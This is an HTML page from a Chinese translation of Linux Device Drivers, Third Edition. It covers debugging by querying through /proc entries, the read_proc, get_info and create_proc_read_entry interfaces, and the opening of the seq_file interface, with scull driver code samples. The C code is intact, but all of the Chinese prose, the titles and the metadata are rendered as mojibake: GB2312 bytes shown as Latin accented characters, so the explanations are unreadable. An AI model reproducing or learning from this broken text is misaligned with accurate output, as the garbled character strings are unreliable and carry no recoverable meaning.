<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>4.3.&#160;ÓÃ²éÑ¯À´µ÷ÊÔ-LinuxÉè±¸Çı¶¯µÚÈı°æ£¨ÖĞÎÄ°æ£©- - </title>
<meta name="description" content="Çı¶¯¿ª·¢- - " />
<meta name="keywords" content="LinuxÉè±¸Çı¶¯,ÖĞÎÄ°æ,µÚÈı°æ,ldd,linux device driver,Çı¶¯¿ª·¢,µç×Ó°æ,³ÌĞòÉè¼Æ,Èí¼ş¿ª·¢, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux Éè±¸Çı¶¯ Edition 3">
<link rel="up" href="ch04.html" title="µÚ&#160;4&#160;ÕÂ&#160;µ÷ÊÔ¼¼Êõ">
<link rel="prev" href="ch04s02.html" title="4.2.&#160;ÓÃ´òÓ¡µ÷ÊÔ">
<link rel="next" href="ch04s04.html" title="4.4.&#160;Ê¹ÓÃ¹Û²ìÀ´µ÷ÊÔ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">4.3.&#160;ÓÃ²éÑ¯À´µ÷ÊÔ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch04s02.html">ÉÏÒ»Ò³</a>&#160;</td>
<th width="60%" align="center">µÚ&#160;4&#160;ÕÂ&#160;µ÷ÊÔ¼¼Êõ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch04s04.html">ÏÂÒ»Ò³</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DebuggingbyQuerying"></a>4.3.&#160;ÓÃ²éÑ¯À´µ÷ÊÔ</h2></div></div></div>
<p>Ç°ÃæÒ»½ÚÃèÊöÁË printk ÊÇÈÎºÎ¹¤×÷µÄÒÔ¼°ÔõÑùÊ¹ÓÃËü. Ã»ÓĞÌ¸µ½µÄÊÇËüµÄÈ±µã.</p>
<p>´óÁ¿Ê¹ÓÃ printk ÄÜ¹»ÏÔÖøµØÍÏÂıÏµÍ³, ¼´±ãÄã½µµÍ cosole_loglevel À´±ÜÃâ¼ÓÔØ¿ØÖÆÌ¨Éè±¸, ÒòÎª syslogd »á²»Í£µØÍ¬²½ËüµÄÊä³öÎÄ¼ş; Òò´Ë, Òª´òÓ¡µÄÃ¿Ò»ĞĞ¶¼ÒıÆğÒ»´Î´ÅÅÌ²Ù×÷. ´Ó syslogd µÄ½Ç¶ÈÕâÊÇÕıÈ·µÄÊµÏÖ. ËüÊÔÍ¼½«ËùÓĞ¶«Î÷Ğ´µ½´ÅÅÌÉÏ, ·ÀÖ¹ÏµÍ³¸ÕºÃÔÚ´òÓ¡ÏûÏ¢ºó±ÀÀ£; È»¶ø, Äã²»ÏëÖ»ÊÇÎªÁËµ÷ÊÔĞÅÏ¢µÄÔ­Òò¶øÍÏÂıÄãµÄÏµÍ³. ¿ÉÒÔÔÚ³öÏÖÓÚ /etc/syslogd.conf ÖĞµÄÄãµÄÈÕÖ¾ÎÄ¼şÃûÇ°¼ÓÒ»¸öÁ¬×ÖºÅÀ´½â¾öÕâ¸öÎÊÌâ<sup>[<a name="id421348" href="#ftn.id421348">14</a>]</sup>. ¸Ä±äÅäÖÃÎÄ¼ş´øÀ´µÄÎÊÌâÊÇ, Õâ¸ö¸Ä±ä¿ÉÄÜÔÚÄã½áÊøµ÷ÊÔºó±£ÁôÔÚÄÇÀï, ¼´±ãÔÚÕı³£ÏµÍ³²Ù×÷ÖĞÄãÈ·ÊµÏë¾¡¿ìË¢ĞÂÏûÏ¢µ½´ÅÅÌ. ÕâÑùÓÀ¾Ã¸Ä±äµÄÁíÍâµÄÑ¡ÔñÊÇÔËĞĞÒ»¸ö·Ç klogd ³ÌĞò( ÀıÈç cat /proc/kmsg, ÈçÖ®Ç°½¨ÒéµÄ), µ«ÊÇÕâ¿ÉÄÜ²»»áÌá¹©Ò»¸öºÏÊÊµÄ»·¾³¸øÕı³£µÄÏµÍ³²Ù×÷.</p>
<p>¾­³£µØ, ×îºÃµÄ»ñµÃÏà¹ØĞÅÏ¢µÄ·½·¨ÊÇ²éÑ¯ÏµÍ³, ÔÚÄãĞèÒªÏûÏ¢Ê±, ²»ÊÇÁ¬ĞøµØ²úÉúÊı¾İ. Êµ¼ÊÉÏ, Ã¿¸ö Unix ÏµÍ³Ìá¹©Ğí¶à¹¤¾ßÀ´»ñÈ¡ÏµÍ³ÏûÏ¢: ps, netstat, vmstat, µÈµÈ.</p>
<p>ÓĞ¼¸¸ö¼¼Êõ¸øÇı¶¯¿ª·¢ÕßÀ´²éÑ¯ÏµÍ³: ´´½¨Ò»¸öÎÄ¼şÔÚ /proc ÎÄ¼şÏµÍ³ÏÂ, Ê¹ÓÃ ioctl Çı¶¯·½·¨, ½èÖú sysfs Êä³öÊôĞÔ. Ê¹ÓÃ sysfs ĞèÒª²»ÉÙ¹ØÓÚÇı¶¯Ä£ĞÍµÄ±³¾°ÖªÊ¶. ÔÚ 14 ÕÂÌÖÂÛ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="UsingtheprocFilesystem"></a>4.3.1.&#160;Ê¹ÓÃ /proc ÎÄ¼şÏµÍ³</h3></div></div></div>
<p>/procÎÄ¼şÏµÍ³ÊÇÒ»¸öÌØÊâµÄÈí¼ş´´½¨µÄÎÄ¼şÏµÍ³, ÄÚºËÓÃÀ´Êä³öÏûÏ¢µ½Íâ½ç. /proc ÏÂµÄÃ¿¸öÎÄ¼ş¶¼°óµ½Ò»¸öÄÚºËº¯ÊıÉÏ, µ±ÎÄ¼ş±»¶ÁµÄÊ±ºò¼´Ê±²úÉúÎÄ¼şÄÚÈİ. ÎÒÃÇÒÑ¾­¼ûµ½Ò»Ğ©ÕâÑùµÄÎÄ¼şÆğ×÷ÓÃ; ÀıÈç, /proc/modules, ³£³£·µ»Øµ±Ç°ÒÑ¼ÓÔØµÄÄ£¿éÁĞ±í.</p>
<p>/proc ÔÚ Linux ÏµÍ³ÖĞ·Ç³£¶àµØÓ¦ÓÃ. ºÜ¶àÏÖ´ú Linux ·¢²¼ÖĞµÄ¹¤¾ß, ÀıÈç ps, top, ÒÔ¼° uptime, ´Ó /proc ÖĞ»ñÈ¡ËüÃÇµÄĞÅÏ¢. Ò»Ğ©Éè±¸Çı¶¯Ò²Í¨¹ı /proc Êä³öĞÅÏ¢, ÄãµÄÒ²¿ÉÒÔÕâÑù×ö. /proc ÎÄ¼şÏµÍ³ÊÇ¶¯Ì¬µÄ, Òò´ËÄãµÄÄ£¿é¿ÉÒÔÔÚÈÎºÎÊ±ºòÌí¼Ó»òÈ¥³ıÌõÄ¿.</p>
<p>ÍêÈ«ÌØĞÔµÄ /proc ÌõÄ¿¿ÉÄÜÊÇ¸´ÔÓµÄÒ°ÊŞ; ÁíÍâ, ËüÃÇ¿ÉĞ´Ò²¿É¶Á, µ«ÊÇ, ´ó²¿·ÖÊ±¼ä, /proc ÌõÄ¿ÊÇÖ»¶ÁµÄÎÄ¼ş. ±¾½ÚÖ»Éæ¼°¼òµ¥µÄÖ»¶ÁÇé¿ö. ÄÇĞ©¸ĞĞËÈ¤ÓÚÊµÏÖ¸ü¸´ÔÓµÄ¶«Î÷µÄÈË¿ÉÒÔ´ÓÕâÀï»ñÈ¡»ù±¾ÖªÊ¶; ½ÓÏÂÀ´¿É²Î¿¼ÄÚºËÔ´ÂëÀ´»ñÖªÍêÕûµÄĞÅÏ¢.</p>
<p>ÔÚÎÒÃÇ¼ÌĞøÖ®Ç°, ÎÒÃÇÓ¦µ±Ìá¼°ÔÚ /proc ÏÂÌí¼ÓÎÄ¼şÊÇ²»¹ÄÀøµÄ. /proc ÎÄ¼şÏµÍ³ÔÚÄÚºË¿ª·¢Õß¿´×÷ÊÇÓĞµãÎŞ·¨¿ØÖÆµÄ»ìÂÒ, ËüÒÑ¾­Ô¶ÀëËüµÄ±¾À´Ä¿µÄÁË(ÊÇÌá¹©¹ØÓÚÏµÍ³ÖĞÔËĞĞµÄ½ø³ÌµÄĞÅÏ¢). ½¨ÒéĞÂ´úÂëÖĞÊ¹ĞÅÏ¢¿É»ñÈ¡µÄ·½·¨ÊÇÀûÓÃ sysfs. ÈçÍ¬½¨ÒéµÄ, Ê¹ÓÃ sysfs ĞèÒª¶Ô Linux Éè±¸Ä£ĞÍµÄÀí½â, È»¶ø, ÎÒÃÇÖ±µ½ 14 ÕÂ²Å½Ó´¥Ëü. Í¬Ê±, /proc ÏÂµÄÎÄ¼şÉÔÉÔÈİÒ×´´½¨, ²¢ÇÒËüÃÇÍêÈ«ÊÊºÏµ÷ÊÔÄ¿µÄ, ËùÒÔÎÒÃÇÔÚÕâÀï°üº¬ËüÃÇ.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Implementingfileinproc"></a>4.3.1.1.&#160;ÔÚ /proc ÀïÊµÏÖÎÄ¼ş</h4></div></div></div>
<p>ËùÓĞÊ¹ÓÃ /proc µÄÄ£¿éÓ¦µ±°üº¬ &lt;linux/proc_fs.h&gt; À´¶¨ÒåÕıÈ·µÄº¯Êı.</p>
<p>Òª´´½¨Ò»¸öÖ»¶Á /proc ÎÄ¼ş, ÄãµÄÇı¶¯±ØĞëÊµÏÖÒ»¸öº¯ÊıÀ´ÔÚÎÄ¼ş±»¶ÁÊ±²úÉúÊı¾İ. µ±Ä³¸ö½ø³Ì¶ÁÎÄ¼şÊ±(Ê¹ÓÃ read ÏµÍ³µ÷ÓÃ), Õâ¸öÇëÇóÍ¨¹ıÕâ¸öº¯Êıµ½´ïÄãµÄÄ£¿é. ÎÒÃÇÏÈ¿´¿´Õâ¸öº¯Êı²¢ÔÚ±¾ÕÂºóÃæÌÖÂÛ×¢²á½Ó¿Ú.</p>
<p>µ±Ò»¸ö½ø³Ì¶ÁÄãµÄ /proc ÎÄ¼ş, ÄÚºË·ÖÅäÁËÒ»Ò³ÄÚ´æ(¾ÍÊÇËµ, PAGE_SIZE ×Ö½Ú), Çı¶¯¿ÉÒÔĞ´ÈëÊı¾İÀ´·µ»Ø¸øÓÃ»§¿Õ¼ä. ÄÇ¸ö»º´æÇø´«µİ¸øÄãµÄº¯Êı, ÊÇÒ»¸ö³ÆÎª read_proc µÄ·½·¨:</p>
<pre class="programlisting">
				int (*read_proc)(char *page, char **start, off_t offset, int count, int *eof, void *data);
</pre>
<p>page Ö¸ÕëÊÇÄãĞ´ÄãµÄÊı¾İµÄ»º´æÇø; start ÊÇÕâ¸öº¯ÊıÓÃÀ´ËµÓĞ¹ØµÄÊı¾İĞ´ÔÚÒ³ÖĞÄÄÀï(ÏÂÃæ¸ü¶à¹ØÓÚÕâ¸ö); offset ºÍ count ¶ÔÓÚ read ·½·¨ÓĞÍ¬ÑùµÄº¬Òå. eof ²ÎÊıÖ¸ÏòÒ»¸öÕûÊı, ±ØĞëÓÉÇı¶¯ÉèÖÃÀ´Ö¸Ê¾Ëü²»ÔÙÓĞÊı¾İ·µ»Ø, data ÊÇÇı¶¯ÌØ¶¨µÄÊı¾İÖ¸Õë, Äã¿ÉÒÔÓÃ×öÄÚ²¿ÓÃÍ¾.</p>
<p>Õâ¸öº¯ÊıÓ¦µ±·µ»ØÊµ¼Ê°Ú·ÅÓÚ page »º´æÇøµÄÊı¾İµÄ×Ö½ÚÊı, ¾ÍÏó read ·½·¨¶Ô±ğµÄÎÄ¼şËù×÷Ò»Ñù. ±ğµÄÊä³öÖµÊÇ *eof ºÍ *start. eof ÊÇÒ»¸ö¼òµ¥µÄ±êÖ¾, µ«ÊÇ start ÖµµÄÊ¹ÓÃÓĞĞ©¸´ÔÓ; ËüµÄÄ¿µÄÊÇ°ïÖúÊµÏÖ´óµÄ(³¬¹ıÒ»Ò³) /proc ÎÄ¼ş.</p>
<p>start ²ÎÊıÓĞĞ©·Ç´«Í³µÄÓÃ·¨. ËüµÄÄ¿µÄÊÇÖ¸Ê¾ÄÄÀï(ÄÄÒ»Ò³)ÕÒµ½·µ»Ø¸øÓÃ»§µÄÊı¾İ. µ±µ÷ÓÃÄãµÄ proc_read ·½·¨, *start ½«»áÊÇ NULL. Èç¹ûÄã±£³ÖËüÎª NULL, ÄÚºË¼Ù¶¨Êı¾İÒÑ·Å½ø page Æ«ÒÆÊÇ 0; »»¾ä»°Ëµ, Ëü¼Ù¶¨Ò»¸öÍ·ÄÔ¼òµ¥µÄ proc_read °æ±¾, Ëü°²·ÅĞéÄâÎÄ¼şµÄÕû¸öÄÚÈİµ½ page, Ã»ÓĞ×¢Òâ offset ²ÎÊı. Èç¹û, Ïà·´, ÄãÉèÖÃ *start ÎªÒ»¸ö ·ÇNULL Öµ, ÄÚºËÈÏÎªÓÉ *start Ö¸ÏòµÄÊı¾İ¿¼ÂÇÁË offset, ²¢ÇÒ×¼±¸ºÃÖ±½Ó·µ»Ø¸øÓÃ»§. Í¨³£, ·µ»ØÉÙÁ¿Êı¾İµÄ¼òµ¥ proc_read ·½·¨Ö»ÊÇºöÂÔ start. ¸ü¸´ÔÓµÄ·½·¨ÉèÖÃ *start Îª page ²¢ÇÒÖ»´ÓÇëÇóµÄ offset ÄÇÀï¿ªÊ¼°²·ÅÊı¾İ.</p>
<p>»¹ÓĞÒ»¶Î¾àÀëµ½ /proc ÎÄ¼şµÄÁíÒ»¸öÖ÷ÒªÎÊÌâ, ËüÒ²´òËã½â´ğ start. ÓĞÊ±ÄÚºËÊı¾İ½á¹¹µÄ ASCII ±íÊ¾ÔÚÁ¬ĞøµÄ read µ÷ÓÃÖĞ¸Ä±ä, Òò´Ë¶Á½ø³Ì¿ÉÄÜ·¢ÏÖ´ÓÒ»¸öµ÷ÓÃµ½ÏÂÒ»¸öÓĞ²»Ò»ÖÂµÄÊı¾İ. Èç¹û *start Éè³ÉÒ»¸öĞ¡µÄÕûÊıÖµ, µ÷ÓÃÕßÓÃËüÀ´µİÔö filp-&lt;f_pos ²»ÒÀÀµÄã·µ»ØµÄÊı¾İÁ¿, Òò´ËÊ¹ f_pos ³ÉÎªÄãµÄ read_proc ¹ı³ÌµÄÒ»¸öÄÚ²¿¼ÇÂ¼Êı. Èç¹û, ÀıÈç, Èç¹ûÄãµÄ read_proc º¯Êı´ÓÒ»¸ö´ó½á¹¹Êı×é·µ»ØĞÅÏ¢²¢ÇÒµÚÒ»´Îµ÷ÓÃ·µ»ØÁË 5 ¸ö½á¹¹, *start¿ÉÉè³É5. ÏÂÒ»¸öµ÷ÓÃÌá¹©Í¬Ò»¸öÊı×÷Îª offset; Çı¶¯¾ÍÖªµÀ´ÓÊı×éÖĞµÚ 6 ¸ö½á¹¹·µ»ØÊı¾İ. ÕâÊÇ±»ËüµÄ×÷Õß³ĞÈÏµÄÒ»¸ö" hack ", ¿ÉÒÔÔÚ fs/proc/generic.c ¼ûµ½.</p>
<p>×¢Òâ, ÓĞ¸üºÃµÄ·½·¨ÊµÏÖ´óµÄ /proc ÎÄ¼ş; Ëü³ÆÎª seq_file, ÎÒÃÇºÜ¿ì»áÌÖÂÛËü. Ê×ÏÈ, È»¶ø, ÊÇÊ±¼ä¾Ù¸öÀı×ÓÁË. ÏÂÃæÊÇÒ»¸ö¼òµ¥µÄ(ÓĞµã³óÂª) read_proc ÊµÏÖ, Îª scull Éè±¸:</p>
<pre class="programlisting">
int scull_read_procmem(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
    int i, j, len = 0;
    int limit = count - 80; /* Don't print more than this */

    for (i = 0; i &lt; scull_nr_devs &amp;&amp; len &lt;= limit; i++) {
        struct scull_dev *d = &amp;scull_devices[i];
        struct scull_qset *qs = d-&gt;data;
        if (down_interruptible(&amp;d-&gt;sem))
            return -ERESTARTSYS;
        len += sprintf(buf+len,"\nDevice %i: qset %i, q %i, sz %li\n", i, d-&gt;qset, d-&gt;quantum, d-&gt;size);
        for (; qs &amp;&amp; len &lt;= limit; qs = qs-&gt;next) { /* scan the list */
            len += sprintf(buf + len, " item at %p, qset at %p\n", qs, qs-&gt;data);
            if (qs-&gt;data &amp;&amp; !qs-&gt;next) /* dump only the last item */
                for (j = 0; j &lt; d-&gt;qset; j++) {
                    if (qs-&gt;data[j])
                        len += sprintf(buf + len, " % 4i: %8p\n", j, qs-&gt;data[j]);
                }
        }
        up(&amp;scull_devices[i].sem);

    }
    *eof = 1;
    return len;

}
</pre>
<p>ÕâÊÇÒ»¸öÏàµ±µäĞÍµÄ read_proc ÊµÏÖ. Ëü¼Ù¶¨²»»áÓĞ±ØÒª²úÉú³¬¹ıÒ»Ò³Êı¾İ²¢ÇÒÒò´ËºöÂÔÁË start ºÍ offset Öµ. ËüÊÇ, µ«ÊÇ, Ğ¡ĞÄµØ²»¸²¸ÇËüµÄ»º´æ, Ö»ÊÇÒÔ·ÀÍòÒ».</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Anolderinterface"></a>4.3.1.2.&#160;ÀÏ½Ó¿Ú</h4></div></div></div>
<p>Èç¹ûÄãÔÄÀÀÄÚºËÔ´Âë, Äã»áÓöµ½Ê¹ÓÃÀÏ½Ó¿ÚÊµÏÖ /proc µÄ´úÂë:</p>
<pre class="programlisting">
int (*get_info)(char *page, char **start, off_t offset, int count); 
</pre>
<p>ËùÓĞµÄ²ÎÊıµÄº¬ÒåÍ¬ read_proc µÄÏàÍ¬, µ«ÊÇÃ»ÓĞ eof ºÍ data ²ÎÊı. Õâ¸ö½Ó¿ÚÈÔÈ»Ö§³Ö, µ«ÊÇ½«À´»áÏûÊ§; ĞÂ´úÂëÓ¦µ±Ê¹ÓÃ read_proc ½Ó¿ÚÀ´´úÌæ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Creatingyourprocfile"></a>4.3.1.3.&#160;´´½¨ÄãµÄ /proc ÎÄ¼ş</h4></div></div></div>
<p>Ò»µ©ÄãÓĞÒ»¸ö¶¨ÒåºÃµÄ read_proc º¯Êı, ÄãÓ¦µ±Á¬½ÓËüµ½ /proc ²ã´ÎÖĞµÄÒ»¸öÈë¿ÚÏî. Ê¹ÓÃÒ»¸ö creat_proc_read_entry µ÷ÓÃ:</p>
<pre class="programlisting">
struct proc_dir_entry *create_proc_read_entry(const char *name,mode_t mode, struct proc_dir_entry *base, read_proc_t *read_proc, void *data); 
 </pre>
<p>ÕâÀï, name ÊÇÒª´´½¨µÄÎÄ¼şÃû×Ó, mod ÊÇÎÄ¼şµÄ±£»¤ÑÚÂë(È±Ê¡ÏµÍ³·¶Î§Ê±¿ÉÒÔ×÷Îª 0 ´«µİ), base Ö¸³öÒª´´½¨µÄÎÄ¼şµÄÄ¿Â¼( Èç¹û base ÊÇ NULL, ÎÄ¼şÔÚ /proc ¸ùÏÂ´´½¨ ), read_proc ÊÇÊµÏÖÎÄ¼şµÄ read_proc º¯Êı, data ±»ÄÚºËºöÂÔ( µ«ÊÇ´«µİ¸ø read_proc). Õâ¾ÍÊÇ scull Ê¹ÓÃµÄµ÷ÓÃ, À´Ê¹ËüµÄ /proc º¯Êı¿ÉÓÃ×ö /proc/scullmem:</p>
<pre class="programlisting">
create_proc_read_entry("scullmem", 0 /* default mode */,
                       NULL /* parent dir */, scull_read_procmem,
                       NULL /* client data */);
</pre>
<p>ÕâÀï, ÎÒÃÇ´´½¨ÁËÒ»¸öÃûÎª scullmem µÄÎÄ¼ş, Ö±½ÓÔÚ /proc ÏÂ, ´øÓĞÈ±Ê¡µÄ, È«¾Ö¿É¶ÁµÄ±£»¤.</p>
<p>Ä¿Â¼Èë¿ÚÖ¸Õë¿ÉÓÃÀ´ÔÚ /proc ÏÂ´´½¨Õû¸öÄ¿Â¼²ã´Î. µ«ÊÇ, ×¢Òâ, Ò»¸öÈë¿Ú·ÅÔÚ /proc µÄ×ÓÄ¿Â¼ÏÂ»á¸üÈİÒ×, Í¨¹ı¼òµ¥µØ¸ø³öÄ¿Â¼Ãû×Ó×÷ÎªÕâ¸öÈë¿ÚÃû×ÓµÄÒ»²¿·Ö -- Ö»ÒªÕâ¸öÄ¿Â¼×ÔÉíÒÑ¾­´æÔÚ. ÀıÈç, Ò»¸ö(³£³£±»ºöÂÔ)´«Í³µÄÊÇ /proc ÖĞÓëÉè±¸Çı¶¯ÏàÁ¬µÄÈë¿ÚÓ¦µ±ÔÚ driver/ ×ÓÄ¿Â¼ÏÂ; scull ÄÜ¹»°²·ÅËüµÄÈë¿ÚÔÚÄÇÀï, ¼òµ¥µØÍ¨¹ıÖ¸¶¨ËüÎªÃû×Ó driver/scullmem.</p>
<p>/proc ÖĞµÄÈë¿Ú, µ±È», Ó¦µ±ÔÚÄ£¿éĞ¶ÔØºóÈ¥³ı. remove_proc_entry ÊÇ»Ö¸´ create_proc_read_entry Ëù×öµÄÊÂÇéµÄº¯Êı:</p>
<pre class="programlisting">
remove_proc_entry("scullmem", NULL /* parent dir */); 
</pre>
<p>È¥³ıÈë¿ÚÊ§°Ü»áµ¼ÖÂÔÚ²»Ï£ÍûµÄÊ±¼äµ÷ÓÃ, »òÕß, Èç¹ûÄãµÄÄ£¿éÒÑ±»Ğ¶ÔØ, ÄÚºË±Àµô.</p>
<p>µ±ÈçÕ¹Ê¾µÄÊ¹ÓÃ /proc ÎÄ¼ş, Äã±ØĞë¼Ç×¡¼¸¸öÊµÏÖµÄÂé·³ÊÂ -- ²»ÒªÆæ¹ÖÏÖÔÚ²»¹ÄÀøÊ¹ÓÃËü.</p>
<p>×îÖØÒªµÄÎÊÌâÊÇ¹ØÓÚÈ¥³ı /proc Èë¿Ú. ÕâÑùµÄÈ¥³ıºÜ¿ÉÄÜÔÚÎÄ¼şÊ¹ÓÃÊ±·¢Éú, ÒòÎªÃ»ÓĞËùÓĞÕß¹ØÁªµ½ /proc Èë¿Ú, Òò´ËÊ¹ÓÃËüÃÇ²»»á×÷ÓÃµ½Ä£¿éµÄÒıÓÃ¼ÆÊı. Õâ¸öÎÊÌâ¿ÉÒÔ¼òµ¥µÄ´¥·¢, ÀıÈçÍ¨¹ıÔËĞĞ sleep 100 &lt; /proc/myfile, ¸ÕºÃÔÚÈ¥³ıÄ£¿éÖ®Ç°.</p>
<p>ÁíÍâÒ»¸öÎÊÌâÊ±¹ØÓÚÓÃÍ¬ÑùµÄÃû×Ó×¢²áÁ½¸öÈë¿Ú. ÄÚºËĞÅÈÎÇı¶¯, ²»»á¼ì²éÃû×ÓÊÇ·ñÒÑ¾­×¢²áÁË, Òò´ËÈç¹ûÄã²»Ğ¡ĞÄ, Äã¿ÉÄÜ»áÊ¹ÓÃÍ¬ÑùµÄÃû×Ó×¢²áÁ½¸ö»ò¶à¸öÈë¿Ú. ÕâÊÇÒ»¸öÒÑÖª·¢ÉúÔÚ½ÌÊÒÖĞµÄÎÊÌâ, ÕâÑùµÄÈë¿ÚÊÇ²»ÄÜÇø·ÖµÄ, ²»µ«ÔÚÄã´æÈ¡ËüÃÇÊ±, ¶øÇÒÔÚÄãµ÷ÓÃ remove_proc_entry Ê±.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Theseqfileinterface"></a>4.3.1.4.&#160;seq_file ½Ó¿Ú</h4></div></div></div>
<p>ÈçÎÒÃÇÉÏÃæÌáµ½µÄ, ÔÚ /proc ÏÂµÄ´óÎÄ¼şµÄÊµÏÖÓĞµãÂé·³. Ò»Ö±ÒÔÀ´, /proc ·½·¨ÒòÎªµ±Êä³öÊıÁ¿±ä´óÊ±µÄ´íÎóÊµÏÖ±äµÃÉùÃûÀÇ½å. ×÷ÎªÒ»ÖÖÇåÀí /proc ´úÂëÒÔ¼°Ê¹ÄÚºË¿ª·¢Õß»îµÃÇáËÉĞ©µÄ·½·¨, Ìí¼ÓÁË seq_file ½Ó¿Ú. Õâ¸ö½Ó¿ÚÌá¹©ÁË¼òµ¥µÄÒ»Ì×º¯ÊıÀ´ÊµÏÖ´óÄÚºËĞéÄâÎÄ¼ş.</p>
<p>set_file ½Ó¿Ú¼Ù¶¨ÄãÔÚ´´½¨Ò»¸öĞéÄâÎÄ¼ş, ËüÉæ¼°Ò»ÏµÁĞµÄ±ØĞë·µ»Ø¸øÓÃ»§¿Õ¼äµÄÏî. ÎªÊ¹ÓÃ seq_file, Äã±ØĞë´´½¨Ò»¸ö¼òµ¥µÄ "iterator" ¶ÔÏó, ËüÄÜÔÚĞòÁĞÀï½¨Á¢Ò»¸öÎ»ÖÃ, ÏòÇ°½ø, ²¢ÇÒÊä³öĞòÁĞÀïµÄÒ»¸öÏî. Ëü¿ÉÄÜÌıÆğÀ´¸´ÔÓ, µ«ÊÇ, Êµ¼ÊÉÏ, ¹ı³Ì·Ç³£¼òµ¥. ÎÒÃÇÒ»²½²½À´´´½¨ /proc ÎÄ¼şÔÚ scull Çı¶¯Àï, À´Õ¹Ê¾ËüÊÇÈçºÎ×öµÄ.</p>
<p>µÚÒ»²½, ²»¿É±ÜÃâµØ, ÊÇ°üº¬ &lt;linux/seq_file.h&gt;. ½Ó×ÅÄã±ØĞë´´½¨ 4 ¸ö iterator ·½·¨, ³ÆÎª start, next, stop, ºÍ show.</p>
<p>start ·½·¨Ò»Ö±ÊÇÊ×ÏÈµ÷ÓÃ. Õâ¸öº¯ÊıµÄÔ­ĞÍÊÇ:</p>
<pre class="programlisting">
void *start(struct seq_file *sfile, loff_t *pos);
</pre>
<p>sfile ²ÎÊı¿ÉÒÔ¼¸ºõÊÇÒ»Ö±±»ºöÂÔ. pos ÊÇÒ»¸öÕûĞÍÎ»ÖÃÖµ, Ö¸Ê¾Ó¦µ±´ÓÄÄÀï¶Á. Î»ÖÃµÄ½âÊÍÍêÈ«È¡¾öÓÚÊµÏÖ; ÔÚ½á¹ûÎÄ¼şÀï²»ĞèÒªÊÇÒ»¸ö×Ö½ÚÎ»ÖÃ. ÒòÎª seq_file ÊµÏÖµäĞÍµØ²½½øÒ»ÏµÁĞ¸ĞĞËÈ¤µÄÏî, position ³£³£±»½âÊÍÎªÖ¸ÏòĞòÁĞÖĞÏÂÒ»¸öÏîµÄÖ¸Õë. scull Çı¶¯½âÊÍÃ¿¸öÉè±¸×÷ÎªÏµÁĞÖĞµÄÒ»Ïî, Òò´Ë½øÈëµÄ pos ¼òµ¥µØÊÇÒ»¸ö scull_device Êı×éµÄË÷Òı. Òò´Ë, scull Ê¹ÓÃµÄ start ·½·¨ÊÇ:</p>
<pre class="programlisting">
static void *scull_seq_start(struct seq_file *s, loff_t *pos)
{
    if (*pos &gt;= scull_nr_devs)
        return NULL;  /* No more to read */
    return scull_devices + *pos;
}
</pre>
<p>·µ»ØÖµ, Èç¹û·ÇNULL, ÊÇÒ»¸ö¿ÉÒÔ±» iterator ÊµÏÖÊ¹ÓÃµÄË½ÓĞÖµ.</p>
<p>next º¯ÊıÓ¦µ±ÒÆ¶¯ iterator µ½ÏÂÒ»¸öÎ»ÖÃ, Èç¹ûĞòÁĞÀïÊ²Ã´¶¼Ã»ÓĞÊ£ÏÂ¾Í·µ»Ø NULL. Õâ¸ö·½·¨µÄÔ­ĞÍÊÇ:</p>
<pre class="programlisting">
void *next(struct seq_file *sfile, void *v, loff_t *pos); 
</pre>
<p>ÕâÀï, v ÊÇ´ÓÇ°Ò»¸ö¶Ô start »òÕß next µÄµ÷ÓÃ·µ»ØµÄ iterator, pos ÊÇÎÄ¼şµÄµ±Ç°Î»ÖÃ. next Ó¦µ±µİÔöÓĞ pos Ö¸ÏòµÄÖµ; ¸ù¾İÄãµÄ iterator ÊÇÈçºÎ¹¤×÷µÄ, Äã¿ÉÄÜ(¾¡¹Ü¿ÉÄÜ²»»á)ĞèÒªµİÔö pos ²»Ö¹ÊÇ 1. ÕâÊÇ scull Ëù×öµÄ:</p>
<pre class="programlisting">
static void *scull_seq_next(struct seq_file *s, void *v, loff_t *pos)
{
    (*pos)++;
    if (*pos &gt;= scull_nr_devs)
        return NULL;
    return scull_devices + *pos;
}
</pre>
<p>µ±ÄÚºË´¦ÀíÍê iterator, Ëüµ÷ÓÃ stop À´ÇåÀí:</p>
<pre class="programlisting">
void stop(struct seq_file *sfile, void *v); 
</pre>
<p>scull ÊµÏÖÃ»ÓĞÇåÀí¹¤×÷Òª×ö, ËùÒÔËüµÄ stop ·½·¨ÊÇ¿ÕµÄ.</p>
<p>Éè¼ÆÉÏ, ÖµµÃ×¢Òâ seq_file ´úÂëÔÚµ÷ÓÃ start ºÍ stop Ö®¼ä²»Ë¯Ãß»òÕß½øĞĞÆäËû·ÇÔ­×ÓĞÔÈÎÎñ. ÄãÒ²¿Ï¶¨»á¿´µ½ÔÚµ÷ÓÃ start ºóÂíÉÏÓĞÒ»¸ö stop µ÷ÓÃ. Òò´Ë, ¶ÔÄãµÄ start ·½·¨À´ËµÇëÇóĞÅºÅÁ¿»ò×ÔĞıËøÊÇ°²È«µÄ. Ö»ÒªÄãµÄÆäËû seq_file ·½·¨ÊÇÔ­×ÓµÄ, µ÷ÓÃµÄÕû¸öĞòÁĞÊÇÔ­×ÓµÄ. (Èç¹ûÕâÒ»¶Î¶ÔÄãÃ»ÓĞÒâÒå, ÔÚÄã¶ÁÁËÏÂÒ»ÕÂºóÔÙ»Øµ½Õâ.)</p>
